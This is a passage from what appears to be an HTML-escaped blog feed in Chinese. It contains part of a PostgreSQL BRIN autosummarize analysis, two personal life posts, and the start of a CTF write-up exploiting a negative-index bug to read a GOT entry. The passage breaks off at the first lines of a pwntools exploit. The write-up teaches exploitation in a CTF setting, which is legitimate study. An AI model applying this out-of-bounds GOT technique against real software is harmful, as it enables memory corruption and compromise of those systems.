+&lt;p&gt;PostgreSQL 在插入或更新行时会更新已存在的索引条目，对应的索引条目不存在时则跳过。而在 &lt;code class=&quot;highlighter-rouge&quot;&gt;vacuum&lt;/code&gt; 或显式调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;brin_summarize_new_values&lt;/code&gt; 时才会为表中未统计的数据块新增索引条目。从 PostgreSQL 10 开始新增 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 参数，开启 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 后，当表不断被插入新的行导致新增的数据块大于 &lt;code class=&quot;highlighter-rouge&quot;&gt;pages_per_range&lt;/code&gt; 时，将会自动统计这些新增的数据块并为此插入新的索引条目。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 并不会立即开始且都会成功，它尝试在 &lt;code class=&quot;highlighter-rouge&quot;&gt;AutoAacuumWork&lt;/code&gt; 的请求队列中追加一项 &lt;code class=&quot;highlighter-rouge&quot;&gt;AVW_BRINSummarizeRange&lt;/code&gt; 的任务，而这个任务便是调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;summarize_range&lt;/code&gt; 函数&lt;sup&gt;[3]&lt;/sup&gt;。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;if (!lastPageTuple)
+{
+    bool		recorded;
+
+    recorded = AutoVacuumRequestWork(AVW_BRINSummarizeRange,
+                                        RelationGetRelid(idxRel),
+                                        lastPageRange);
+    if (!recorded)
+        ereport(LOG,
+                (errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),
+                    errmsg(&quot;request for BRIN range summarization for index \&quot;%s\&quot; page %u was not recorded&quot;,
+                        RelationGetRelationName(idxRel),
+                        lastPageRange)));
+}
+else
+    LockBuffer(buf, BUFFER_LOCK_UNLOCK);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;请求队列的长度 &lt;code class=&quot;highlighter-rouge&quot;&gt;NUM_WORKITEMS&lt;/code&gt; 是固定的，默认为 256。在 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum_work&lt;/code&gt; 执行 &lt;code class=&quot;highlighter-rouge&quot;&gt;do_autovacuum&lt;/code&gt; 时处理这些任务&lt;sup&gt;[4]&lt;/sup&gt;。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;/*
+ * Perform additional work items, as requested by backends.
+ */
+LWLockAcquire(AutovacuumLock, LW_EXCLUSIVE);
+for (i = 0; i &amp;lt; NUM_WORKITEMS; i++)
+{
+    AutoVacuumWorkItem *workitem = &amp;amp;AutoVacuumShmem-&amp;gt;av_workItems[i];
+
+    if (!workitem-&amp;gt;avw_used)
+        continue;
+    if (workitem-&amp;gt;avw_active)
+        continue;
+    if (workitem-&amp;gt;avw_database != MyDatabaseId)
+        continue;
+
+    /* claim this one, and release lock while performing it */
+    workitem-&amp;gt;avw_active = true;
+    LWLockRelease(AutovacuumLock);
+
+    perform_work_item(workitem);
+
+    /*
+     * Check for config changes before acquiring lock for further jobs.
+     */
+    CHECK_FOR_INTERRUPTS();
+    if (got_SIGHUP)
+    {
+        got_SIGHUP = false;
+        ProcessConfigFile(PGC_SIGHUP);
+    }
+
+    LWLockAcquire(AutovacuumLock, LW_EXCLUSIVE);
+
+    /* and mark it done */
+    workitem-&amp;gt;avw_active = false;
+    workitem-&amp;gt;avw_used = false;
+}
+LWLockRelease(AutovacuumLock);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;当前 &lt;code class=&quot;highlighter-rouge&quot;&gt;AutoVacuumWorkItemType&lt;/code&gt; 只有 &lt;code class=&quot;highlighter-rouge&quot;&gt;AVW_BRINSummarizeRange&lt;/code&gt; 这一种，在 PostgreSQL 未来的版本很可能会继续使用这一框架，新增更多来自 backend 的任务类型。&lt;/p&gt;
+
+&lt;p&gt;当请求队列已满且 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum_work&lt;/code&gt; 来不及处理时 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 就会失败。只要数据插入足够快，索引就跟不上我，所以即便是开启了 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt;，在大量数据被不断插入表中的情况下，请求队列会被迅速占满，导致 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 失败，出现大量错误日志：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;XXXX-XX-XX 09:39:55.832 UTC [67] LOG:  request for BRIN range summarization for index &quot;idx&quot; page 58311 was not recorded
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;BRIN 索引需要定期被更新，否则就可能存在大量还未索引的记录，还有数据更新也导致一些索引条目失效或统计出现偏差。在 BRIN 索引不完整时过滤性能变差，无论查询的记录是否在已存在的索引条目中，在 Heap bitmap index scan 之后仍需要重新 Recheck 未统计的数据块，速度可能会变得非常缓慢，从原来的十几毫秒延长到几秒是有可能的，进而影响相关的业务系统。下面是一个比较极端的情况下的查询。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;
+
+                                                       QUERY PLAN
+-------------------------------------------------------------------------------------------------------------------------
+ Bitmap Heap Scan on example  (cost=12.03..50726.88 rows=1 width=37) (actual time=19.317..6047.938 rows=1900 loops=1)
+   Recheck Cond: ((id &amp;gt; 100) AND (id &amp;lt;= 2000))
+   Rows Removed by Index Recheck: 39598741
+   Heap Blocks: lossy=330006
+   Buffers: shared hit=1 read=330007
+   -&amp;gt;  Bitmap Index Scan on idx  (cost=0.00..12.03 rows=15355 width=0) (actual time=19.085..19.085 rows=3301120 loops=1)
+         Index Cond: ((id &amp;gt; 100) AND (id &amp;lt;= 2000))
+         Buffers: shared hit=1 read=1
+ Planning Time: 0.782 ms
+ Execution Time: 6048.140 ms
+(10 rows)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;对比使用 Parallel Seq Scan 的查询：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;
+
+                                                          QUERY PLAN
+------------------------------------------------------------------------------------------------------------------------------
+ Gather  (cost=1000.00..584334.60 rows=1 width=37) (actual time=1.751..1645.756 rows=1900 loops=1)
+   Workers Planned: 2
+   Workers Launched: 2
+   Buffers: shared hit=16219 read=317115
+   -&amp;gt;  Parallel Seq Scan on example  (cost=0.00..583334.50 rows=1 width=37) (actual time=1089.990..1635.938 rows=633 loops=3)
+         Filter: ((id &amp;gt; 100) AND (id &amp;lt;= 2000))
+         Rows Removed by Filter: 13332700
+         Buffers: shared hit=16219 read=317115
+ Planning Time: 0.659 ms
+ Execution Time: 1646.008 ms
+(10 rows)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;autovacuum-为什么也没用&quot;&gt;autovacuum 为什么也没用&lt;/h3&gt;
+
+&lt;p&gt;上面一节提到了问题可能是 &lt;code class=&quot;highlighter-rouge&quot;&gt;AutoAacuumWork&lt;/code&gt; 队列已满，但是日常运行的 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 也应该可以实现相同的效果，为什么也没用呢。为了方便测试，我们可单独将表运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 的相关阈值调低，其他保持则默认值：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ALTER TABLE example SET (autovacuum_vacuum_scale_factor = 0.0);
+ALTER TABLE example SET (autovacuum_vacuum_threshold = 100);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;然后根据我们的业务场景，不断在表中插入大量数据，然后观察 &lt;code class=&quot;highlighter-rouge&quot;&gt;pg_stat_user_tables&lt;/code&gt; 中记录：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;safeline=# SELECT * FROM pg_stat_user_tables where relname = 'example';
+
+-[ RECORD 1 ]-------+------------------------------
+relid               | 32824
+schemaname          | public
+relname             | example
+seq_scan            | 81
+seq_tup_read        | 202398405
+idx_scan            | 5
+idx_tup_fetch       | 198003205
+n_tup_ins           | 110000010
+n_tup_upd           | 0
+n_tup_del           | 0
+n_tup_hot_upd       | 0
+n_live_tup          | 110000000
+n_dead_tup          | 0
+n_mod_since_analyze | 0
+last_vacuum         |
+last_autovacuum     |
+last_analyze        |
+last_autoanalyze    | xxxx-xx-xx 08:31:25.114953+00
+vacuum_count        | 0
+autovacuum_count    | 0
+analyze_count       | 0
+autoanalyze_count   | 3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;last_autovacuum&lt;/code&gt; 一直为空，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;autoanalyze&lt;/code&gt; 能够预期地按照一定频率运行。原来在 &lt;code class=&quot;highlighter-rouge&quot;&gt;do_autovacuum&lt;/code&gt; 函数执行时，大致可分为 &lt;code class=&quot;highlighter-rouge&quot;&gt;dovacuum&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;doanalyze&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;doworkitems&lt;/code&gt; 等过程，而其中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;relation_needs_vacanalyze&lt;/code&gt; 函数将判断关系表是否需要做 &lt;code class=&quot;highlighter-rouge&quot;&gt;vacuum&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;analyze&lt;/code&gt;。在仅插入的场景下，表的 &lt;code class=&quot;highlighter-rouge&quot;&gt;n_dead_tup&lt;/code&gt; 很小（本例中没有行被更新或删除，&lt;code class=&quot;highlighter-rouge&quot;&gt;n_dead_tup&lt;/code&gt; 为 0），如果只调整 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 的运行频率等配置，&lt;code class=&quot;highlighter-rouge&quot;&gt;dovacuum&lt;/code&gt; 也可能不会被触发。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A table needs to be vacuumed if the number of dead tuples exceeds a threshold.  This threshold is calculated as&lt;/p&gt;
+
+  &lt;p&gt;threshold = vac_base_thresh + vac_scale_factor * reltuples&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;当然，前面说明了 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 需要依赖 &lt;code class=&quot;highlighter-rouge&quot;&gt;do_autovacuum&lt;/code&gt; 中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;doworkitems&lt;/code&gt; 来进行处理，如果 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 没有运行，则 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 也是无效的。&lt;/p&gt;
+
+&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
+
+&lt;p&gt;[1]: &lt;a href=&quot;https://mp.weixin.qq.com/s/4MF9yMzoJQdk0Qa4jw2xSQ&quot;&gt;PostgreSQL中BRIN和BTREE索引的比较&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[2]: &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/access/brin/brin_revmap.c#L197&quot;&gt;GitHub - brin_revmap.c&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[3]: &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/access/brin/brin.c#L190&quot;&gt;GitHub - brin.c&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[4]: &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/postmaster/autovacuum.c#L2559&quot;&gt;GitHub - autovacuum.c&lt;/a&gt;&lt;/p&gt;</content><author><name>MonoUno</name></author><category term="后端" /><summary type="html">作者：@monouno，现实习于长亭科技。原文发表在 https://zhuanlan.zhihu.com/p/50167673</summary></entry><entry><title type="html">mv 2018 2019</title><link href="https://strcpy.me/index.php/archives/792/" rel="alternate" type="text/html" title="mv 2018 2019" /><published>2019-01-26T00:00:01+00:00</published><updated>2019-01-26T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/2018</id><content type="html" xml:base="https://strcpy.me/index.php/archives/792/">&lt;p&gt;这是一篇迟到的简短的文章。&lt;/p&gt;
+
+&lt;p&gt;一转眼，2018 年就过去了，回想一下，有些碌碌无为。&lt;/p&gt;
+
+&lt;p&gt;工作上，差强人意吧，很难跳出自己的舒适区去做一些更感兴趣和更有挑战性的事情。成长的速度低于预期，有时候也需要多去看看同龄人、搞同样方向的人都在做什么、有什么成果。不管做什么事情都要有明确的目标，然后尽快开始。&lt;/p&gt;
+
+&lt;p&gt;年底互联网的几波裁员潮和不太乐观的经济形势让很多人比较慌，对于公司来说，缺了任何一个人都可以继续工作，所以完善个人竞争力是重中之重。当然经济形势的问题也影响很多生活上的选择，在新的一年里，也应该有自己的判断，应该做什么，不应该做什么。&lt;/p&gt;
+
+&lt;p&gt;生活上，一如既往，和孙同学还不错，得考虑下下一步的计划了。还有就是不能太宅了，得多出去走走。&lt;/p&gt;
+
+&lt;p&gt;在厨艺上，这一年有挺大的进步，有过比较多的尝试，在下厨房上都有分享。&lt;/p&gt;
+
+&lt;p&gt;养了两只巴西龟，一只爱吃爱活动长得快的，一只不爱动不太吃得了肺炎最终死了。。还有十多条小金鱼，为了它们还 DIY 了一个过滤。&lt;/p&gt;
+
+&lt;p&gt;这几天换了房子，隔壁的哥们去杭州了，我就租下了他的房子，他还送了我们一堆不带走的东西，虽然是捡破烂，但是也很高兴，哈哈哈。住了两年多暗无天日的朝北的房子，清晨的阳光照进屋子里面的时候，竟然还有些激动，同样激动的还有大龟龟。当然搬家和收拾屋子确实挺累的，屋子虽然小，但是东西是绝对的多。&lt;/p&gt;
+
+&lt;p&gt;大概前几年打球跑步导致的吧，去拍了个核磁，膝关节半月板轻度损伤，带来的就是走路多了之后膝盖疼，通过针对性的训练之后有所缓解，不太想这么年轻就“残疾”了。。&lt;/p&gt;
+
+&lt;p&gt;目标&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;一定要跳出工作的舒适区&lt;/li&gt;
+  &lt;li&gt;多看书，专业有关的无关的&lt;/li&gt;
+  &lt;li&gt;攒钱，然后决定买房子还是囤现金过冬天&lt;/li&gt;
+  &lt;li&gt;健身锻炼&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>virusdefender</name></author><category term="生活" /><summary type="html">这是一篇迟到的简短的文章。</summary></entry><entry><title type="html">DIY 了鱼缸过滤</title><link href="https://strcpy.me/index.php/archives/791/" rel="alternate" type="text/html" title="DIY 了鱼缸过滤" /><published>2018-11-23T12:46:07+00:00</published><updated>2018-11-23T12:46:07+00:00</updated><id>https://strcpy.me/index.php/archives/DIY%20%E4%BA%86%E9%B1%BC%E7%BC%B8%E8%BF%87%E6%BB%A4</id><content type="html" xml:base="https://strcpy.me/index.php/archives/791/">&lt;p&gt;前几个月妹子买了两只小龟，是密西西比红耳龟，国内一般称巴西龟，淘宝上小苗子一般几块钱一只。我之后又买了一些草金鱼，一开始是 20 多条，除去陆续死掉的和看样子不大行喂了龟的，现在还剩一半，已经一段时间没有死过了。&lt;/p&gt;
+
+&lt;p&gt;我是使用两个收纳箱当鱼缸的，尺寸都是 40 cm * 20 cm * 30 cm，受制于空间，两个缸是靠在一起的，周围几乎没有别的空间了。&lt;/p&gt;
+
+&lt;p&gt;为了给龟儿子和小鱼鱼营造一个好一些的生活环境，也为了保持水质，防止散发气味，我开始了解鱼缸过滤，搜了一下淘宝，一般这种小型的鱼缸加紧凑空间会使用上部滴流过滤，而淘宝上的并不是太满足我两个缸同时使用的需求，不太方便接入两根进水管和两根出水管，所以经过思考，决定自己 DIY 一个。&lt;/p&gt;
+
+&lt;p&gt;下图是淘宝上的滴流盒&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;材料&quot;&gt;材料&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;潜水泵，鱼缸使用带加氧功能的侧吸泵，龟缸使用普通底吸泵；配套软管，软管的尺寸也影响后续的部件尺寸，我用了大约一米长的四分管&lt;/li&gt;
+  &lt;li&gt;方形密封饭盒一个&lt;/li&gt;
+  &lt;li&gt;水箱接头四个，弯头两个（一头螺纹一头软管缩头），两个直转接头（同前一个）&lt;/li&gt;
+  &lt;li&gt;其他工具和零部件，比如饭盒上打孔的电钻和开孔器、美工刀、钳子和铁丝等，这些我家里都有，就没有再买&lt;/li&gt;
+  &lt;li&gt;过滤材料，包括过滤棉、过滤布（300目）和细菌屋等&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;制作步骤&quot;&gt;制作步骤&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;饭盒盖子和底部各打两个孔，同一面的孔靠近同一个边，然后盖上盖子的时候，进水口和出水口错开，增加水在盒子里面的流动距离。&lt;/li&gt;
+  &lt;li&gt;连接相关的零件和管子，安放盒子在两个缸中间，使用软管帮助固定。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;过滤材料的放置&quot;&gt;过滤材料的放置&lt;/h2&gt;
+
+&lt;p&gt;一块过滤棉，大约盒子的二分之一大小，然后下面垫过滤布，用盒子盖压住过滤布，清理的时候，打开盖子去除过滤布清洗就可以了。如果没有过滤布，残渣仍然有可能被水冲回缸里面。&lt;/p&gt;
+
+&lt;p&gt;过滤布下面就是细菌屋了，培养硝化细菌的，我的饭盒比较小，只能放三块，我觉得聊胜于无吧。&lt;/p&gt;
+
+&lt;h2 id=&quot;存在的问题&quot;&gt;存在的问题&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;最明显的问题，就是一个泵在使用的时候，水会流到另外一个缸里面的，尤其是龟缸是加热恒温25度的，鱼缸是不加热的。其实我一开始还买了两个阀门，两端都是连接软管的，但是后来发现，这个阀门流量太小了，很容易造成盒子内积水和溢出，就暂时去掉了，在使用的时候，手动使用一个阀门堵住另外一根出水管。&lt;/li&gt;
+  &lt;li&gt;出水管有时候会有气泡，造成流量大幅下降，将出水管弄直或者放在水面以下，一般情况下不会出现盒子水溢出的问题。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;两只小龟几个月已经长了一厘米了，由 2.7cm 和 3.5 cm 长到了 3.5cm 和 4.5 cm。不过最近小龟有些生病，左眼睛肿的厉害，滴了左氧氟沙星之后会好很多，然后呼气有声音，貌似也有肺炎，不过吃饭和精神还不错，就暂时没有多加干预。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="生活" /><summary type="html">前几个月妹子买了两只小龟，是密西西比红耳龟，国内一般称巴西龟，淘宝上小苗子一般几块钱一只。我之后又买了一些草金鱼，一开始是 20 多条，除去陆续死掉的和看样子不大行喂了龟的，现在还剩一半，已经一段时间没有死过了。</summary></entry><entry><title type="html">二进制安全之栈溢出（十一）</title><link href="https://strcpy.me/index.php/archives/790/" rel="alternate" type="text/html" title="二进制安全之栈溢出（十一）" /><published>2018-11-09T12:46:07+00:00</published><updated>2018-11-09T12:46:07+00:00</updated><id>https://strcpy.me/index.php/archives/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA(%E5%8D%81%E4%B8%80)</id><content type="html" xml:base="https://strcpy.me/index.php/archives/790/">&lt;p&gt;本文是 plt 和 got 表相关的漏洞利用实例，是 &lt;a href=&quot;https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/Fridge%20todo%20list&quot;&gt;Google CTF&lt;/a&gt; 中的一道题，题目给了源码和 binary。&lt;/p&gt;
+
+&lt;p&gt;通过阅读代码，可以发现&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;int idx = read_int();
+if (idx &amp;gt; TODO_COUNT) {
+    puts(OUT_OF_BOUNDS_MESSAGE);
+    return;
+}
+printf(&quot;What's your TODO? &quot;);
+fflush(stdout);
+read_line(&amp;amp;todos[idx*TODO_LENGTH], TODO_LENGTH);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这里虽然检查了 &lt;code class=&quot;highlighter-rouge&quot;&gt;idx&lt;/code&gt; 最大不能超过某个范围，但是没有检查小于零的情况，所以如果构造小于零的 &lt;code class=&quot;highlighter-rouge&quot;&gt;idx&lt;/code&gt;，就可以读取比 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 数组地址还小的位置的内存了，同理，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;write_all&lt;/code&gt; 函数中，也可以任意的去写这个位置的内存。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 是一个全局变量，所以它的内存地址是确定的，是在 bss 段。因为 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 的索引会乘以 &lt;code class=&quot;highlighter-rouge&quot;&gt;TODO_LENGTH&lt;/code&gt;，所以内存的读取是跳跃的，每次都相差 48 个字节。&lt;/p&gt;
+
+&lt;p&gt;使用 gdb 调试，&lt;code class=&quot;highlighter-rouge&quot;&gt;set follow-fork-mode parent&lt;/code&gt; 然后 &lt;code class=&quot;highlighter-rouge&quot;&gt;b main&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;p &amp;amp;todos&lt;/code&gt; 可以看到内存地址。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ p &amp;amp;todos
+$1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;todos&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;在 IDA 中，也可以看到 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;got&lt;/code&gt; 表距离也非常近，写一个小程序算一下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/790/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x203140&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;结合 IDA 的结果和计算输出的结果，可以标记出来一些有用的数据&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x203140 -&amp;gt; todos
+0x203110
+0x2030e0
+0x2030b0
+         0x203088（非整数倍） -&amp;gt; atoi
+0x203080 -&amp;gt; open
+0x203050 -&amp;gt; strncat
+0x203020 -&amp;gt; write
+0x202ff0
+0x202fc0
+0x202f90
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;比如先读一下 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的地址&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-------------------------------------code-------------------------------------]
+   0x555555554900 &amp;lt;puts@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202712]        # 0x555555757018
+   0x555555554906 &amp;lt;puts@plt+6&amp;gt;:	push   0x0
+   0x55555555490b &amp;lt;puts@plt+11&amp;gt;:	jmp    0x5555555548f0
+=&amp;gt; 0x555555554910 &amp;lt;write@plt&amp;gt;:	jmp    QWORD PTR [rip+0x20270a]        # 0x555555757020
+ | 0x555555554916 &amp;lt;write@plt+6&amp;gt;:	push   0x1
+ | 0x55555555491b &amp;lt;write@plt+11&amp;gt;:	jmp    0x5555555548f0
+ | 0x555555554920 &amp;lt;strlen@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202702]        # 0x555555757028
+ | 0x555555554926 &amp;lt;strlen@plt+6&amp;gt;:	push   0x2
+ |-&amp;gt;   0x555555554916 &amp;lt;write@plt+6&amp;gt;:	push   0x1
+       0x55555555491b &amp;lt;write@plt+11&amp;gt;:	jmp    0x5555555548f0
+       0x555555554920 &amp;lt;strlen@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202702]        # 0x555555757028
+       0x555555554926 &amp;lt;strlen@plt+6&amp;gt;:	push   0x2
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;重新画一下数据分布图&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x555555757140 -&amp;gt; todos
+0x555555757110
+0x5555557570e0
+0x5555557570b0
+0x555555757080
+0x555555757050
+0x555555757020 =&amp;gt; 0x555555554916 -&amp;gt; write@plt+6
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;由以前的知识就知道 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x555555757020&lt;/code&gt; 就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的 got 表的地址，减去刚才已知的 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 的位置，正好是 &lt;code class=&quot;highlighter-rouge&quot;&gt;(0x555555757020 - 0x555555757140) / 48 == -6&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;可以先构造一个读取 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的 got 表地址 exp&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;
+
